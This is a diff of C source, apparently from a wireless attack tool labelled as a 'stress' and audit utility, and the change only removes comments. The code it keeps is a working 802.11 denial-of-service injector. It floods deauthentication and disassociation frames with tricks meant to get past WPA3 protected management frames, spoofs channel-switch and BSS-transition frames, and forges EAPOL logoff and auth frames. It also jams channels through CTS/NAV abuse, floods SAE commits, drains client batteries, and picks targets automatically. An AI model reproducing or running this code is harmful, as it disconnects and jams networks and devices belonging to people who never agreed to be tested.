 } stress_inj_arg_t;
 
@@ -4162,7 +4082,7 @@ static void *stress_injector_thread(void *arg) {
   xorshift64_t rng;
   xs64_seed(&rng);
 
-  /* Rate control per mode */
+  
   double base_sleep;
   switch (a->cfg->mode) {
   case MODE_STEALTH:
@@ -4219,10 +4139,10 @@ static void *stress_injector_thread(void *arg) {
       continue;
     }
 
-    /* Get current hopper channel */
+    
     int cur_ch = atomic_load(&g_stress_ch);
 
-    /* Inject into APs on the current channel only */
+    
     for (int i = 0; i < nap && !g_stop; i++) {
       if (snap[i].channel != cur_ch)
         continue;
@@ -4252,12 +4172,12 @@ static void *stress_injector_thread(void *arg) {
       int len;
       int sent_for_ap = 0;
 
-      /* Build and inject selected vectors on-the-fly */
+      
       if (a->cfg->vec_on[VEC_DEAUTH_FLOOD]) {
         /* [UPGRADE] Micro-Burst & PMF Baiting (WPA3 Evasion) */
-        /* Send a burst of 3 packets to overload the WPA3 PMF discard queue */
+        
         for (int burst = 0; burst < 3; burst++) {
-            /* 1. PMF Baiting: Reason 6 (Class 2 frame received) */
+            
             len = mk_deauth(tmp, bss, bss, 6, (seq++) & 0xFFF);
             if (inject_one(sock, tmp, len) > 0) {
               atomic_fetch_add(&g_pkts_sent, 1);
@@ -4266,7 +4186,7 @@ static void *stress_injector_thread(void *arg) {
               atomic_fetch_add(&g_pkts_fail, 1);
             }
 
-            /* 2. PMF Baiting: Reason 7 (Class 3 frame received) */
+            
             len = mk_deauth(tmp, bss, bss, 7, (seq++) & 0xFFF);
             if (inject_one(sock, tmp, len) > 0) {
               atomic_fetch_add(&g_pkts_sent, 1);
@@ -4275,7 +4195,7 @@ static void *stress_injector_thread(void *arg) {
               atomic_fetch_add(&g_pkts_fail, 1);
             }
 
-            /* 3. Standard Rotated Reason (Unicast) */
+            
             uint16_t reason = REASON_CODES[seq % N_REASONS];
             len = mk_deauth(tmp, bss, bss, reason, (seq++) & 0xFFF);
             if (inject_one(sock, tmp, len) > 0) {
@@ -4285,7 +4205,7 @@ static void *stress_injector_thread(void *arg) {
               atomic_fetch_add(&g_pkts_fail, 1);
             }
 
-            /* 4. Reverse Deauth (Client -> AP spoofing) */
+            
             uint8_t fake_cli[6];
             rand_mac(fake_cli);
             uint16_t rev_reason = REASON_CODES[seq % N_REASONS];
@@ -4302,7 +4222,7 @@ static void *stress_injector_thread(void *arg) {
       if (a->cfg->vec_on[VEC_DISASSOC_FLOOD]) {
         /* [UPGRADE] Micro-Burst & PMF Baiting for Disassoc */
         for (int burst = 0; burst < 3; burst++) {
-            /* 1. PMF Baiting: Reason 6 */
+            
             len = mk_disassoc(tmp, bss, BCAST, 6, seq++);
             if (inject_one(sock, tmp, len) > 0) {
               atomic_fetch_add(&g_pkts_sent, 1);
@@ -4311,7 +4231,7 @@ static void *stress_injector_thread(void *arg) {
               atomic_fetch_add(&g_pkts_fail, 1);
             }
 
-            /* 2. PMF Baiting: Reason 7 */
+            
             len = mk_disassoc(tmp, bss, BCAST, 7, seq++);
             if (inject_one(sock, tmp, len) > 0) {
               atomic_fetch_add(&g_pkts_sent, 1);
@@ -4320,7 +4240,7 @@ static void *stress_injector_thread(void *arg) {
               atomic_fetch_add(&g_pkts_fail, 1);
             }
 
-            /* 3. Standard Rotated Reason */
+            
             uint16_t dis_reason = REASON_CODES[seq % N_REASONS];
             len = mk_disassoc(tmp, bss, BCAST, dis_reason, seq++);
             if (inject_one(sock, tmp, len) > 0) {
@@ -4336,9 +4256,9 @@ static void *stress_injector_thread(void *arg) {
         uint8_t fake_cli[6];
         rand_mac(fake_cli);
         /* [FIX 47] Zero-copy EAPOL logoff with correct offsets */
-        memcpy(tpl_eapol + OFF_A1, bss, 6);      /* addr1 = RA = BSSID */
-        memcpy(tpl_eapol + OFF_A2, fake_cli, 6); /* addr2 = SA = Client */
-        memcpy(tpl_eapol + OFF_A3, bss, 6);      /* addr3 = DA = BSSID */
+        memcpy(tpl_eapol + OFF_A1, bss, 6);      
+        memcpy(tpl_eapol + OFF_A2, fake_cli, 6); 
+        memcpy(tpl_eapol + OFF_A3, bss, 6);      
         if (inject_one(sock, tpl_eapol, tpl_eapol_len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
@@ -4398,7 +4318,7 @@ static void *stress_injector_thread(void *arg) {
 
         /* [UPGRADE] Realistic Countdown Burst ending in 0 */
         for (int c = 3; c >= 0; c--) {
-          /* 1. Target specific AP BSSID */
+          
           len = mk_probe_resp_csa(tmp, bss, BCAST, ssid, (uint8_t)snap[i].channel,
                                   (uint8_t)redir, (uint8_t)c);
           if (inject_one(sock, tmp, len) > 0) {
@@ -4406,10 +4326,7 @@ static void *stress_injector_thread(void *arg) {
             sent_for_ap++;
           }
 
-          /* 2. Wildcard BSSID (Bypass AP MAC Randomization)
-           * Sends Probe Response with BSSID=FF:FF:FF:FF:FF:FF.
-           * Clients searching for the SSID will process the CSA regardless of the
-           * AP's real MAC. */
+          
           len = mk_probe_resp_csa(tmp, BCAST, BCAST, ssid,
                                   (uint8_t)snap[i].channel, (uint8_t)redir, (uint8_t)c);
           if (inject_one(sock, tmp, len) > 0) {
@@ -4435,11 +4352,11 @@ static void *stress_injector_thread(void *arg) {
          * offsets) */
         uint8_t fake_cli[6];
         rand_mac(fake_cli);
-        memcpy(tpl_auth + OFF_A1, bss, 6);      /* addr1 = DA = BSSID */
-        memcpy(tpl_auth + OFF_A2, fake_cli, 6); /* addr2 = SA = Client */
-        memcpy(tpl_auth + OFF_A3, bss, 6);      /* addr3 = BSSID */
+        memcpy(tpl_auth + OFF_A1, bss, 6);      
+        memcpy(tpl_auth + OFF_A2, fake_cli, 6); 
+        memcpy(tpl_auth + OFF_A3, bss, 6);      
         uint16_t s_ctrl = htole16(((seq++) & 0xFFF) << 4);
-        memcpy(tpl_auth + OFF_SEQ, &s_ctrl, 2); /* seq */
+        memcpy(tpl_auth + OFF_SEQ, &s_ctrl, 2); 
         if (inject_one(sock, tpl_auth, tpl_auth_len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
           sent_for_ap++;
@@ -4460,14 +4377,14 @@ static void *stress_injector_thread(void *arg) {
 
         /* [UPGRADE] Realistic Countdown Burst ending in 0 */
         for (int c = 3; c >= 0; c--) {
-          /* 1. Target specific AP BSSID */
+          
           len = mk_csa_action(tmp, bss, BCAST, (uint8_t)redir, (uint8_t)c);
           if (inject_one(sock, tmp, len) > 0) {
             atomic_fetch_add(&g_pkts_sent, 1);
             sent_for_ap++;
           }
 
-          /* 2. Wildcard BSSID (Bypass MAC Randomization) */
+          
           len = mk_csa_action(tmp, BCAST, BCAST, (uint8_t)redir, (uint8_t)c);
           if (inject_one(sock, tmp, len) > 0) {
             atomic_fetch_add(&g_pkts_sent, 1);
@@ -4495,7 +4412,7 @@ static void *stress_injector_thread(void *arg) {
         uint8_t fake_cli[6];
         rand_mac(fake_cli);
         for (int tid = 0; tid < 8; tid++) {
-          /* 1. AP -> Broadcast (Initiator=1, TID=tid) */
+          
           len = mk_delba(tmp, bss, BCAST);
           uint16_t params1 = htole16(0x0800 | (tid << 12));
           memcpy(tmp + OFF_BODY + 2, &params1, 2); /* [FIX 47] correct offset */
@@ -4504,7 +4421,7 @@ static void *stress_injector_thread(void *arg) {
             sent_for_ap++;
           }
 
-          /* 2. Client -> AP (Initiator=0, TID=tid) */
+          
           len = mk_delba(tmp, fake_cli, bss);
           uint16_t params2 = htole16(0x0000 | (tid << 12));
           memcpy(tmp + OFF_BODY + 2, &params2, 2); /* [FIX 47] correct offset */
@@ -4556,7 +4473,7 @@ static void *stress_injector_thread(void *arg) {
           }
         }
 
-        /* Followed by spoofed vacate CSA with ECSA and Quiet Element */
+        
         len = mk_dfs_vacate_csa(tmp, bss, ssid, cur, safe);
         if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
@@ -4568,7 +4485,7 @@ static void *stress_injector_thread(void *arg) {
 
       /* Vector #17: CTS/RTS Virtual Jammer */
       if (a->cfg->vec_on[VEC_CTS_NAV_JAMMER]) {
-        /* CTS with max NAV — silence all devices on this frequency */
+        
         len = mk_cts_nav(tmp, bss);
         if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
@@ -4576,7 +4493,7 @@ static void *stress_injector_thread(void *arg) {
         } else {
           atomic_fetch_add(&g_pkts_fail, 1);
         }
-        /* Also broadcast CTS for wider coverage */
+        
         len = mk_cts_nav(tmp, BCAST);
         if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
@@ -4588,7 +4505,7 @@ static void *stress_injector_thread(void *arg) {
 
       /* Vector #18: WPA3 SAE Hunting & Puzzling */
       if (a->cfg->vec_on[VEC_SAE_HUNTING]) {
-        /* SAE Commit with random source MAC — each forces ECDH computation */
+        
         uint8_t fake_cli[6];
         rand_mac(fake_cli);
         uint16_t sae_groups[] = {19, 20, 21};
@@ -4603,7 +4520,7 @@ static void *stress_injector_thread(void *arg) {
 
       /* Vector #19: BSS Transition Attack (802.11v Steer) */
       if (a->cfg->vec_on[VEC_BSS_TRANSITION]) {
-        /* BTM Request spoofed from AP → broadcast client */
+        
         len = mk_bss_transition(tmp, bss, BCAST);
         if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
@@ -4615,7 +4532,7 @@ static void *stress_injector_thread(void *arg) {
 
       /* Vector #20: Beacon Report Drain (Battery Exploitation) */
       if (a->cfg->vec_on[VEC_BEACON_REPORT_DRAIN]) {
-        /* Radio Measurement Request → broadcast to drain all devices */
+        
         len = mk_beacon_report_req(tmp, bss, BCAST, (uint8_t)snap[i].channel);
         if (inject_one(sock, tmp, len) > 0) {
           atomic_fetch_add(&g_pkts_sent, 1);
@@ -4625,7 +4542,7 @@ static void *stress_injector_thread(void *arg) {
         }
       }
 
-      /* Update per-AP counter lock-free */
+      
       for (int j = 0; j < a->pool->count; j++) {
         if (memcmp(a->pool->aps[j].bssid, bss, 6) == 0) {
           __atomic_fetch_add(&a->pool->aps[j].tx_count, (uint64_t)sent_for_ap,
@@ -4647,30 +4564,29 @@ static void *stress_injector_thread(void *arg) {
     pid_last_sent = curr_sent;
     pid_last_fail = curr_fail;
 
-    if (d_sent + d_fail > 100) { /* only adjust if we have enough sample size */
+    if (d_sent + d_fail > 100) { 
       double fail_rate = (double)d_fail / (double)(d_sent + d_fail);
       
       /* [UPGRADE] Watchdog Evasion (Intel 8265/8275 adaptation) */
       if (fail_rate > 0.30) {
-        /* Severe Buffer Bloat: Ring buffer is jammed.
-         * Enforce immediate hardware cooldown to prevent firmware crash/monitor mode drop. */
-        usleep_precise(0.1); /* 100ms hard pause to drain DMA */
-        base_sleep *= 2.0;   /* Aggressive multiplicative backoff */
+        
+        usleep_precise(0.1); 
+        base_sleep *= 2.0;   
         if (base_sleep > 0.1) base_sleep = 0.1;
       } else if (fail_rate > 0.05) {
-        /* High failure rate: Buffer Bloat detected. Additive Increase (Slow Down) */
+        
         base_sleep += 0.0005;
         if (base_sleep > 0.1)
-          base_sleep = 0.1; /* Max sleep cap */
+          base_sleep = 0.1; 
       } else if (fail_rate == 0.0) {
-        /* Zero failures: Hardware can take more. Multiplicative Decrease (Speed Up) */
+        
         base_sleep *= 0.95;
         if (base_sleep < 0.00001)
-          base_sleep = 0.00001; /* Floor */
+          base_sleep = 0.00001; 
       }
     }
 
-    /* Inter-round sleep using the dynamically tuned value */
+    
     usleep_precise(base_sleep * 2);
   }
 
@@ -4742,7 +4658,7 @@ static void *stress_display_thread(void *arg) {
            "                                             ║\033[K\n",
            h, m, s);
 
-    /* Active vectors */
+    
     printf("  " C_DEEP_B
            "╠══════════════════════════════════════════════════════════╣" RST
            "\n");
@@ -4753,11 +4669,11 @@ static void *stress_display_thread(void *arg) {
            "╠══════════════════════════════════════════════════════════╣" RST
            "\n");
 
-    /* Show AP table */
+    
     stress_ap_t snap[STRESS_MAX_APS];
     int nsnap = stress_pool_snapshot(d->pool, snap, STRESS_MAX_APS);
 
-    /* Sort by channel */
+    
     for (int i = 0; i < nsnap - 1; i++)
       for (int j = i + 1; j < nsnap; j++)
         if (snap[j].channel < snap[i].channel) {
@@ -4827,7 +4743,7 @@ static void *stress_display_thread(void *arg) {
   return NULL;
 }
 
-/* Audit Report Exporter (JSON / CSV) */
+
 static void export_report(const char *path, const stress_pool_t *pool,
                           double elapsed, uint64_t sent, uint64_t fail) {
   if (!path || !path[0])
@@ -4852,7 +4768,7 @@ static void export_report(const char *path, const stress_pool_t *pool,
     }
     pthread_mutex_unlock((pthread_mutex_t *)&pool->lock);
   } else {
-    /* JSON Export */
+    
     fprintf(
         fp,
         "{\n  \"timestamp\": %ld,\n  \"elapsed_seconds\": %.1f,\n  "
@@ -4880,10 +4796,7 @@ static void export_report(const char *path, const stress_pool_t *pool,
 
 /* [FIX] Native TX-Power & Regulatory Domain Unlocker */
 static void unlock_tx_power(const char *iface) {
-  /* Changing regulatory domain or TX power while the interface is UP in monitor
-     mode can cause some drivers to reset the PHY state, effectively blinding
-     the interface and dropping it out of monitor mode at the hardware level. We
-     instead warn the user to do it manually before starting the tool. */
+  
   printf(
       "  " C_YELLOW
       "[!] INSANE mode detected. Note: For max performance, manually unlock TX "
@@ -4922,7 +4835,7 @@ static void run_stress(stress_cfg_t *cfg) {
     }
   }
 
-  /* Active vector list */
+  
   for (int v = 0; v < VEC_COUNT; v++) {
     if (cfg->vec_on[v])
       printf("    " C_GREEN "▸" RST " %s\n", VEC_NAMES[v]);
@@ -4938,7 +4851,7 @@ static void run_stress(stress_cfg_t *cfg) {
 
   printf("\n  " C_GREEN "[✓] Scanning and injecting..." RST "\n\n");
 
-  /* Initialize pool */
+  
   stress_pool_t pool;
   stress_pool_init(&pool);
 
@@ -4950,7 +4863,7 @@ static void run_stress(stress_cfg_t *cfg) {
   signal(SIGINT, sig_handler);
   signal(SIGTERM, sig_handler);
 
-  /* Dwell time per mode */
+  
   int dwell_ms;
   switch (cfg->mode) {
   case MODE_STEALTH:
@@ -4973,7 +4886,7 @@ static void run_stress(stress_cfg_t *cfg) {
     break;
   }
 
-  /* Start scanner threads */
+  
   pthread_t scan_t[2];
   int n_scan = 0;
 
@@ -4997,7 +4910,7 @@ static void run_stress(stress_cfg_t *cfg) {
       free(sa2);
   }
 
-  /* Start hopper threads */
+  
   pthread_t hop_t[2];
   int n_hop = 0;
 
@@ -5006,9 +4919,9 @@ static void run_stress(stress_cfg_t *cfg) {
   ha1->dwell_ms = dwell_ms;
   ha1->nch = 0;
 
-  /* If single radio and scanning 5GHz, put all channels in ha1 */
-  /* If dual radio (normal), ha1 gets 2.4GHz, ha2 gets 5GHz */
-  /* If split-role, ha1 (scanner) gets ALL requested channels */
+  
+  
+  
   if (cfg->split_role) {
       for (int i = 0; i < N_CH_24; i++) ha1->chlist[ha1->nch++] = CH_24[i];
       if (cfg->scan_5ghz) {
@@ -5029,7 +4942,7 @@ static void run_stress(stress_cfg_t *cfg) {
 
   if (cfg->dual_radio && cfg->iface2[0]) {
     if (cfg->split_role) {
-      /* Injector role gets its own hopper with all requested channels */
+      
       stress_hop_arg_t *ha2 = calloc(1, sizeof(*ha2));
       snprintf(ha2->iface, MAX_IFACE, "%s", cfg->iface2);
       ha2->dwell_ms = dwell_ms;
@@ -5043,7 +4956,7 @@ static void run_stress(stress_cfg_t *cfg) {
       else
         free(ha2);
     } else if (cfg->scan_5ghz) {
-      /* Normal dual radio: ha2 gets 5GHz */
+      
       stress_hop_arg_t *ha2 = calloc(1, sizeof(*ha2));
       snprintf(ha2->iface, MAX_IFACE, "%s", cfg->iface2);
       ha2->dwell_ms = dwell_ms;
@@ -5058,7 +4971,7 @@ static void run_stress(stress_cfg_t *cfg) {
     }
   }
 
-  /* Wait for initial AP discovery (2 seconds scan before injection) */
+  
   printf("  Discovering targets");
   for (int i = 0; i < 20 && !g_stop; i++) {
     usleep_precise(0.1);
@@ -5067,7 +4980,7 @@ static void run_stress(stress_cfg_t *cfg) {
   }
   printf(" " C_AQUA "%d APs found" RST "\n\n", atomic_load(&g_stress_aps_seen));
 
-  /* Start injector threads (Sharded Load Balancing) */
+  
   pthread_t inj_t[2];
   int n_inj = 0;
 
@@ -5078,14 +4991,14 @@ static void run_stress(stress_cfg_t *cfg) {
       stress_inj_arg_t *ia = calloc(1, sizeof(*ia));
       ia->cfg = cfg;
       ia->pool = &pool;
-      ia->band = 0; /* Shoot anything */
+      ia->band = 0; 
       snprintf(ia->iface, MAX_IFACE, "%s", cfg->iface2);
       if (pthread_create(&inj_t[n_inj], NULL, stress_injector_thread, ia) == 0)
         n_inj++;
       else
         free(ia);
     } else {
-      /* Fallback if user forgot --dual */
+      
       stress_inj_arg_t *ia = calloc(1, sizeof(*ia));
       ia->cfg = cfg;
       ia->pool = &pool;
@@ -5097,7 +5010,7 @@ static void run_stress(stress_cfg_t *cfg) {
         free(ia);
     }
   } else {
-    /* Injector 1: 2.4GHz Dedicated */
+    
     stress_inj_arg_t *ia1 = calloc(1, sizeof(*ia1));
     ia1->cfg = cfg;
     ia1->pool = &pool;
@@ -5108,7 +5021,7 @@ static void run_stress(stress_cfg_t *cfg) {
     else
       free(ia1);
 
-    /* Injector 2: 5GHz Dedicated (only if scanning 5GHz) */
+    
     if (cfg->scan_5ghz) {
       stress_inj_arg_t *ia2 = calloc(1, sizeof(*ia2));
       ia2->cfg = cfg;
@@ -5126,14 +5039,14 @@ static void run_stress(stress_cfg_t *cfg) {
     }
   }
 
-  /* Start display thread */
+  
   stress_disp_arg_t *da = calloc(1, sizeof(*da));
   da->cfg = cfg;
   da->pool = &pool;
   pthread_t disp_t;
   pthread_create(&disp_t, NULL, stress_display_thread, da);
 
-  /* Wait for duration or Ctrl+C */
+  
   if (cfg->duration > 0) {
     double end = mono_time() + cfg->duration;
     while (!g_stop && mono_time() < end)
@@ -5144,7 +5057,7 @@ static void run_stress(stress_cfg_t *cfg) {
       usleep_precise(0.5);
   }
 
-  /* Cleanup */
+  
   for (int i = 0; i < n_scan; i++)
     pthread_join(scan_t[i], NULL);
   for (int i = 0; i < n_hop; i++)
@@ -5153,7 +5066,7 @@ static void run_stress(stress_cfg_t *cfg) {
     pthread_join(inj_t[i], NULL);
   pthread_join(disp_t, NULL);
 
-  /* Summary */
+  
   printf("\033[?25h\033[2J\033[H");
   double elapsed = mono_time() - g_start_time;
   uint64_t sent = atomic_load(&g_pkts_sent);
@@ -5190,7 +5103,7 @@ static void run_stress(stress_cfg_t *cfg) {
          "╚══════════════════════════════════════════════════════════╝" RST
          "\n\n");
 
-  /* Restore channel 1 */
+  
   set_ch(cfg->iface, 1);
   export_report(cfg->export_file, &pool, elapsed, sent, fail);
   pthread_mutex_destroy(&pool.lock);
@@ -5216,7 +5129,7 @@ int main(int argc, char **argv) {
     return 1;
   }
 
-  /* Script mode */
+  
   if (argc >= 3 && strcmp(argv[1], "--script") == 0) {
     if (system("clear")) {
     }
@@ -5233,7 +5146,7 @@ int main(int argc, char **argv) {
   if (!preflight())
     return 1;
 
-  /* Check for --stress flag */
+  
   bool stress_mode = false;
   bool stress_5ghz = false;
   bool unmask_hidden = false;
@@ -5281,10 +5194,10 @@ int main(int argc, char **argv) {
       snprintf(scfg.iface2, sizeof(scfg.iface2), "%s", global_iface2);
     }
 
-    /* Interface selection */
+    
     menu_iface(scfg.iface, sizeof(scfg.iface));
 
-    /* Vector selection */
+    
     printf("\n  " C_CYAN BLD "Stress Vectors" RST "\n\n");
     printf("  Use default stress vectors (Deauth+Disassoc+CSA+Auth)?\n");
     printf("  " C_AQUA "Y" RST " = Default    " C_AQUA "N" RST
@@ -5301,7 +5214,7 @@ int main(int argc, char **argv) {
       memcpy(scfg.vec_on, tmp.vec_on, sizeof(scfg.vec_on));
       scfg.nvec = tmp.nvec;
     } else {
-      /* Default stress vectors */
+      
       scfg.vec_on[VEC_DEAUTH_FLOOD] = true;
       scfg.vec_on[VEC_DISASSOC_FLOOD] = true;
       scfg.vec_on[VEC_CSA_BEACON] = true;
@@ -5309,10 +5222,10 @@ int main(int argc, char **argv) {
       scfg.nvec = 4;
     }
 
-    /* Mode selection */
+    
     scfg.mode = menu_mode();
 
-    /* Duration */
+    
     printf("\n  Duration (seconds, 0=unlimited) " C_GRAY "[0]" RST ": ");
     fflush(stdout);
     if (fgets(buf, sizeof(buf), stdin)) {
@@ -5340,7 +5253,7 @@ int main(int argc, char **argv) {
     else if (strcmp(argv[i], "--rogue") == 0)
       cli_rogue = true;
     else if (strcmp(argv[i], "--dual") == 0 && i + 1 < argc) {
-      /* Handled globally above, just advance index */
+      
       i++;
     } else if ((strcmp(argv[i], "--target-ssid") == 0 || strcmp(argv[i], "--ssid") == 0) && i + 1 < argc) {
       i++;
@@ -5401,7 +5314,7 @@ int main(int argc, char **argv) {
   menu_vectors(&cfg);
   cfg.mode = menu_mode();
 
-  /* Confirmation */
+  
   printf("\n  " C_DEEP_B "══════════════════════════════════════" RST "\n");
   printf("  IF: %-16s  BSSID: %s\n", iface, tgt.bssid);
   printf("  SSID: %-14s  CH: %d → %d\n", tgt.ssid, tgt.channel, new_ch);
